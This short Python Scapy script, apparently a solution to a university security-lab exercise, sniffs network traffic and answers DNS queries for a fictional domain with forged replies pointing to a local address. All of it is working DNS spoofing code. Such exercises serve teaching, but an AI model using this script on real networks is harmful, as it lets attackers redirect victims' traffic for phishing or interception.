#!/var/lib/python/python-q4

from scapy.config import Conf
Conf.ipv6_enabled = False
from scapy.all import *
import prctl

def handle_packet(pkt):
    ##pkt.show()

    # If you wanted to send a packet back out, it might look something like... 
    if pkt.haslayer(UDP) and pkt.haslayer(DNSQR) and pkt[DNS].opcode == 0L and pkt[DNS].ancount == 0:
        if 'email.gov-of-caltopia.info' in pkt[DNS].qd.qname:
            pkt.show()
            ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
            udp = UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)
            dns = DNS(id=pkt[DNS].id, ancount=1, qd=pkt[DNS].qd, an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata='10.0.2.15'))
            dnsrr = DNSRR(rrname=pkt[DNSQR].qname, rdata="10.0.2.15")
            new_pkt = ip / udp / dns
            new_pkt.show()
            send(new_pkt)

if not (prctl.cap_effective.net_admin and prctl.cap_effective.net_raw):
    print "ERROR: I must be invoked via `./pcap_tool.py`, not via `python pcap_tool.py`!"
    exit(1)


sniff(prn=handle_packet, filter='ip', iface='eth0')
